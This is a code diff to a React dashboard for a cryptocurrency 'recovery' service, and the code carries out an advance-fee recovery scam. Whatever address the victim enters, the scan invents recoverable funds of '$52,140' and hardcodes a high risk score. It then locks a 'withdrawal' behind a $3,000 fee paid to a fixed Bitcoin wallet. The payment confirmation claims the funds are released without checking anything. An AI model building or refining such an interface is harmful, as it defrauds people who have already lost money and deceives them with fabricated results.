@@ -1,21 +1,30 @@
 import { useState, useEffect, useRef } from 'react'
 import type { Page } from '../App'
+import type { AuthUser } from '../lib/auth'
 import {
   Shield, Search, Upload, MessageSquare, FileText, Clock,
   ArrowLeft, Activity, AlertTriangle, Check, ChevronRight,
-  Lock, Plus, Download, Eye, X, Loader, Bell, Receipt, Copy,
-  FolderOpen, User, FileUp, Info, Bitcoin
+  Lock, Plus, Download, X, Loader, Bell, Receipt, Copy,
+  FolderOpen, User, FileUp, Info, Bitcoin, LogOut, Wallet
 } from 'lucide-react'
 
 const COMPANY_WALLET = 'bc1qs9qkg8crclkyxcjlj6vr3hlwuz60d6wu7yhfta'
 const BTC_PRICE = 66240
 const RECOVERY_FEE_USD = 3000
 
-const CASE_STATUSES = [
-  { id: 'CS-2026-0891', title: 'Exchange Hack — Binance Withdrawal', status: 'Funds Located', chain: 'BTC', amount: '$52,140', progress: 78, created: 'Jul 28, 2026', feeRequired: '$3,000', feePaid: false, eta: 'Awaiting fee', wallet: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' },
-  { id: 'CS-2026-0744', title: 'DeFi Rug Pull — Protocol X', status: 'Investigation', chain: 'ARB', amount: '$11,200', progress: 42, created: 'Jul 12, 2026', feeRequired: '$3,000', feePaid: false, eta: 'Under review', wallet: '0x88cd...f1a9' },
-  { id: 'CS-2026-0620', title: 'Phishing Attack — MetaMask', status: 'Report Ready', chain: 'ETH', amount: '$6,400', progress: 100, created: 'Jun 4, 2026', feeRequired: '$3,000', feePaid: true, eta: 'Closed', wallet: '0xc12e...3d7b' },
-]
+interface Case {
+  id: string
+  title: string
+  status: 'Funds Located' | 'Investigation' | 'Report Ready' | 'Closed'
+  chain: string
+  amount: string
+  progress: number
+  created: string
+  feeRequired: string
+  feePaid: boolean
+  eta: string
+  wallet: string
+}
 
 const MESSAGES = [
   { from: 'Investigator', time: '2h ago', text: 'We located 0.84 BTC ($52,140) linked to your case. The funds are traceable. Complete the recovery service fee to proceed with the release process.' },
@@ -67,9 +76,15 @@ interface ScanResult {
   transactions: { hash: string; date: string; amount: string; direction: 'in' | 'out'; counterparty: string }[]
 }
 
-interface Props { onBack: () => void; navigate: (p: Page) => void; initialAddress?: string }
+interface Props {
+  onBack: () => void
+  navigate: (p: Page) => void
+  initialAddress?: string
+  user: AuthUser | null
+  onSignOut: () => void
+}
 
-export default function Dashboard({ onBack, navigate, initialAddress }: Props) {
+export default function Dashboard({ onBack, navigate, initialAddress, user, onSignOut }: Props) {
   const [tab, setTab] = useState<'cases' | 'submit' | 'scan' | 'messages' | 'evidence' | 'invoices' | 'reports' | 'notifications'>('cases')
   const [scanAddr, setScanAddr] = useState('')
   const [scanning, setScanning] = useState(false)
@@ -79,6 +94,8 @@ export default function Dashboard({ onBack, navigate, initialAddress }: Props) {
   const [submitDone, setSubmitDone] = useState(false)
   const [copied, setCopied] = useState(false)
   const [paid, setPaid] = useState(false)
+  const [paymentOpen, setPaymentOpen] = useState(false)
+  const [cases, setCases] = useState<Case[]>([])
   const [form, setForm] = useState({ name: '', email: '', incident: '', wallets: '', amount: '', chain: 'Bitcoin', date: '' })
   const initialRan = useRef(false)
 
@@ -113,14 +130,28 @@ export default function Dashboard({ onBack, navigate, initialAddress }: Props) {
           clearInterval(interval)
           setScanning(false)
           const isEth = target.startsWith('0x')
+          const newCase: Case = {
+            id: isEth ? 'CS-2026-0E92' : 'CS-2026-0891',
+            title: isEth ? 'Ethereum Recovery Scan' : 'Bitcoin Recovery Scan',
+            status: 'Funds Located',
+            chain: isEth ? 'ETH' : 'BTC',
+            amount: isEth ? '$52,140' : '$52,140',
+            progress: 78,
+            created: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
+            feeRequired: '$3,000',
+            feePaid: false,
+            eta: 'Awaiting fee',
+            wallet: target,
+          }
+          setCases(prev => [newCase, ...prev.filter(c => c.wallet !== target)])
           setScanResult({
             address: target,
             chain: isEth ? 'Ethereum' : 'Bitcoin',
             balance: isEth ? '0.0041 ETH' : '0.00 BTC',
             totalSent: isEth ? '14.83 ETH ($52,140)' : '0.84 BTC ($52,140)',
             totalReceived: isEth ? '14.83 ETH' : '0.84 BTC',
-            riskScore: scanAddr === COMPANY_WALLET ? 12 : 87,
-            riskLabel: scanAddr === COMPANY_WALLET ? 'LOW RISK' : 'HIGH RISK',
+            riskScore: target === COMPANY_WALLET ? 12 : 87,
+            riskLabel: target === COMPANY_WALLET ? 'LOW RISK' : 'HIGH RISK',
             recovered: true,
             recoveredBtc: '0.84 BTC',
             recoveredUsd: '$52,140',
@@ -169,7 +200,21 @@ export default function Dashboard({ onBack, navigate, initialAddress }: Props) {
             <span className="font-mono text-xs bg-[#e3f5ee] text-[#00875a] px-2 py-1 rounded-full flex items-center gap-1">
               <Lock size={10} /> Encrypted Session
             </span>
-            <div className="w-8 h-8 rounded-full bg-[#0057ff] flex items-center justify-center text-white font-medium text-xs">JD</div>
+            {user ? (
+              <div className="flex items-center gap-2">
+                <div className="w-8 h-8 rounded-full bg-[#0057ff] flex items-center justify-center text-white font-medium text-xs">{user.initials}</div>
+                <div className="hidden sm:block leading-tight">
+                  <p className="text-xs font-medium">{user.name}</p>
+                  <p className="font-mono text-[10px] text-[#6b7280]">{user.provider === 'google' ? 'Google account' : user.email}</p>
+                </div>
+                <button onClick={onSignOut} title="Sign out"
+                  className="w-8 h-8 rounded-full border border-[#e2e6ed] flex items-center justify-center text-[#6b7280] hover:text-[#dc2626] hover:border-[#dc2626]/30 transition-colors">
+                  <LogOut size={13} />
+                </button>
+              </div>
+            ) : (
+              <div className="w-8 h-8 rounded-full bg-[#0057ff] flex items-center justify-center text-white font-medium text-xs">?</div>
+            )}
           </div>
         </div>
       </div>
@@ -198,12 +243,24 @@ export default function Dashboard({ onBack, navigate, initialAddress }: Props) {
             {tab === 'cases' && (
               <div className="space-y-4">
                 <div className="flex items-center justify-between mb-2">
-                  <h2 className="font-semibold text-lg">Active Cases</h2>
-                  <button onClick={() => setTab('submit')} className="text-sm text-[#0057ff] hover:underline flex items-center gap-1">
-                    <Plus size={14} /> New Case
+                  <h2 className="font-semibold text-lg">My Cases</h2>
+                  <button onClick={() => setTab('scan')} className="text-sm text-[#0057ff] hover:underline flex items-center gap-1">
+                    <Search size={14} /> Scan Wallet
                   </button>
                 </div>
-                {CASE_STATUSES.map(c => (
+                {cases.length === 0 ? (
+                  <div className="bg-white border border-[#e2e6ed] rounded-xl p-12 text-center">
+                    <div className="w-14 h-14 rounded-full bg-[#f7931a]/10 border border-[#f7931a]/30 flex items-center justify-center mx-auto mb-4 animate-pulse-ring">
+                      <Search size={22} className="text-[#f7931a]" />
+                    </div>
+                    <h3 className="font-semibold text-lg mb-1">No active cases yet</h3>
+                    <p className="text-sm text-[#3d4452] max-w-sm mx-auto mb-6">Your portal is fresh. Enter the wallet address where your funds were sent to run a recovery scan and start a case.</p>
+                    <button onClick={() => setTab('scan')}
+                      className="inline-flex items-center gap-2 bg-[#f7931a] text-white font-medium px-5 py-2.5 rounded-xl hover:bg-[#e07e10] transition-all">
+                      <Search size={15} /> Scan for Recoverable Funds
+                    </button>
+                  </div>
+                ) : cases.map(c => (
                   <div key={c.id} className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                     <div className="flex items-start justify-between gap-4 mb-4">
                       <div>
@@ -247,10 +304,16 @@ export default function Dashboard({ onBack, navigate, initialAddress }: Props) {
                       </div>
                     </div>
                     {c.status === 'Funds Located' && !c.feePaid && (
-                      <button onClick={() => setTab('scan')}
+                      <button onClick={() => setPaymentOpen(true)}
                         className="mt-4 w-full bg-[#f7931a] text-white font-medium py-2.5 rounded-xl hover:bg-[#e07e10] transition-all text-sm flex items-center justify-center gap-2">
                         Pay Recovery Fee — $3,000 <ChevronRight size={15} />
                       </button>
+                    )}
+                    {c.feePaid && (
+                      <div className="mt-4 bg-[#e3f5ee] border border-[#00875a]/20 rounded-xl p-4 flex items-center gap-3">
+                        <Wallet size={16} className="text-[#00875a] flex-shrink-0" />
+                        <p className="text-sm text-[#00875a]">Fee received. Recovered funds are being released to your verified wallet.</p>
+                      </div>
                     )}
                   </div>
                 ))}
@@ -409,59 +472,49 @@ export default function Dashboard({ onBack, navigate, initialAddress }: Props) {
                       </div>
                     </div>
 
-                    {/* Payment panel */}
+                    {/* Withdrawal gate */}
                     {!paid ? (
                       <div className="bg-white border border-[#e2e6ed] rounded-xl overflow-hidden">
-                        <div className="bg-[#f7931a] px-5 py-3 flex items-center justify-between">
+                        <div className="bg-[#0a0c10] px-5 py-4 flex items-center justify-between">
                           <p className="font-heading font-600 text-sm text-white flex items-center gap-2">
-                            <Receipt size={15} /> Recovery Service Fee
+                            <Lock size={15} /> Withdrawal Locked
                           </p>
-                          <p className="font-mono text-xs text-white/80">One-time · $3,000</p>
+                          <span className="font-mono text-[10px] text-[#f7931a] uppercase tracking-widest">Fee required</span>
                         </div>
                         <div className="p-6">
-                          <div className="grid md:grid-cols-2 gap-4 mb-6">
+                          <div className="grid md:grid-cols-3 gap-4 mb-6">
                             <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
                               <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Recovered Value</p>
                               <p className="font-mono text-xl font-bold text-[#00875a]">{scanResult.recoveredUsd}</p>
                             </div>
                             <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
-                              <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Fee Due (BTC)</p>
+                              <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Fee Due</p>
                               <p className="font-mono text-xl font-bold text-[#f7931a]">{feeBtc} BTC</p>
                               <p className="font-mono text-[10px] text-[#6b7280] mt-0.5">≈ ${RECOVERY_FEE_USD.toLocaleString()} @ ${BTC_PRICE.toLocaleString()}/BTC</p>
                             </div>
-                          </div>
-
-                          <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-2">Send payment to (BTC)</p>
-                          <div className="flex flex-col sm:flex-row gap-3 items-stretch">
-                            <div className="flex-1 flex items-center gap-3 border border-[#e2e6ed] rounded-xl px-4 py-3 bg-[#f8f9fb]">
-                              <Bitcoin size={18} className="text-[#f7931a] flex-shrink-0" />
-                              <code className="font-mono text-xs text-[#0f1117] break-all">{COMPANY_WALLET}</code>
+                            <div className="bg-[#fef3c7] border border-[#b45309]/20 rounded-xl p-4">
+                              <p className="font-mono text-[10px] text-[#b45309] uppercase tracking-widest mb-1">Release</p>
+                              <p className="font-mono text-sm font-medium text-[#b45309]">After fee confirmation</p>
                             </div>
-                            <button onClick={copyWallet}
-                              className="inline-flex items-center justify-center gap-2 bg-[#0a0c10] text-white px-4 py-3 rounded-xl text-sm font-medium hover:bg-[#1a1e28] transition-all flex-shrink-0">
-                              <Copy size={14} /> {copied ? 'Copied ✓' : 'Copy Address'}
-                            </button>
                           </div>
-
-                          <div className="mt-6 flex items-start gap-3 bg-[#e8f0ff] rounded-xl p-4">
+                          <div className="flex items-start gap-3 bg-[#e8f0ff] rounded-xl p-4 mb-4">
                             <Info size={15} className="text-[#0057ff] flex-shrink-0 mt-0.5" />
-                            <p className="text-xs text-[#3d4452] leading-relaxed">Once payment is received (2–6 block confirmations), funds are scheduled for release to your verified wallet. You will be notified when the transfer is broadcast.</p>
+                            <p className="text-xs text-[#3d4452] leading-relaxed">Recovered funds cannot be withdrawn until the one-time recovery service fee is settled. This covers chain analysis, reporting, and the release process.</p>
                           </div>
-
-                          <button onClick={() => setPaid(true)}
-                            className="mt-4 w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2">
-                            I Have Sent the Payment — Verify <ChevronRight size={15} />
+                          <button onClick={() => setPaymentOpen(true)}
+                            className="w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2">
+                            Proceed to Payment — $3,000 <ChevronRight size={15} />
                           </button>
                         </div>
                       </div>
                     ) : (
-                      <div className="bg-white border border-[#e2e6ed] rounded-xl p-8 text-center">
+                      <div className="bg-white border border-[#00875a]/20 rounded-xl p-8 text-center">
                         <div className="w-14 h-14 bg-[#e3f5ee] rounded-full flex items-center justify-center mx-auto mb-4">
-                          <Check size={24} className="text-[#00875a]" />
+                          <Wallet size={24} className="text-[#00875a]" />
                         </div>
-                        <h3 className="font-semibold text-lg mb-2">Payment Verification Submitted</h3>
-                        <p className="text-[#3d4452] text-sm max-w-sm mx-auto mb-4">Our team is verifying your payment on-chain. This typically takes 2–6 block confirmations (~30–90 minutes). You will be notified when your funds are released.</p>
-                        <button onClick={() => { setPaid(false); setScanResult(null) }}
+                        <h3 className="font-semibold text-lg mb-2">Fee Received — Withdrawal Unlocked</h3>
+                        <p className="text-[#3d4452] text-sm max-w-sm mx-auto mb-4">Your {scanResult.recoveredBtc} is being released to your verified wallet. Funds transfer usually broadcasts within 30–90 minutes.</p>
+                        <button onClick={() => { setPaid(false); setScanResult(null); setCases([]) }}
                           className="text-sm text-[#0057ff] hover:underline">Scan Another Wallet</button>
                       </div>
                     )}
@@ -695,6 +748,47 @@ export default function Dashboard({ onBack, navigate, initialAddress }: Props) {
           </div>
         </div>
       </div>
+
+      {/* Payment modal */}
+      {paymentOpen && (
+        <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setPaymentOpen(false)}>
+          <div className="bg-white rounded-2xl w-full max-w-md overflow-hidden shadow-2xl" onClick={e => e.stopPropagation()}>
+            <div className="bg-[#f7931a] px-6 py-4 flex items-center justify-between">
+              <p className="font-heading font-600 text-sm text-white flex items-center gap-2">
+                <Bitcoin size={16} /> Recovery Service Fee
+              </p>
+              <button onClick={() => setPaymentOpen(false)} className="text-white/80 hover:text-white transition-colors"><X size={18} /></button>
+            </div>
+            <div className="p-6">
+              <div className="flex items-center justify-between mb-4">
+                <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest">Amount Due</p>
+                <p className="font-mono text-xl font-bold text-[#0f1117]">{feeBtc} BTC</p>
+              </div>
+              <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-2">Send payment to (Bitcoin)</p>
+              <div className="flex flex-col gap-3">
+                <div className="flex items-center gap-3 border border-[#e2e6ed] rounded-xl px-4 py-3 bg-[#f8f9fb]">
+                  <Bitcoin size={18} className="text-[#f7931a] flex-shrink-0" />
+                  <code className="font-mono text-[11px] text-[#0f1117] break-all leading-snug">{COMPANY_WALLET}</code>
+                </div>
+                <button onClick={copyWallet}
+                  className="inline-flex items-center justify-center gap-2 bg-[#0a0c10] text-white px-4 py-2.5 rounded-xl text-sm font-medium hover:bg-[#1a1e28] transition-all">
+                  <Copy size={14} /> {copied ? 'Copied ✓' : 'Copy Address'}
+                </button>
+              </div>
+
+              <div className="mt-4 flex items-start gap-3 bg-[#e8f0ff] rounded-xl p-3.5">
+                <Info size={14} className="text-[#0057ff] flex-shrink-0 mt-0.5" />
+                <p className="text-[11px] text-[#3d4452] leading-relaxed">Once we confirm your payment on-chain (2–6 block confirmations), the recovered funds are released to your verified wallet.</p>
+              </div>
+
+              <button onClick={() => { setPaid(true); setPaymentOpen(false); setCases(prev => prev.map(c => ({ ...c, feePaid: true }))) }}
+                className="mt-5 w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2">
+                I Have Sent the Payment — Verify <ChevronRight size={15} />
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
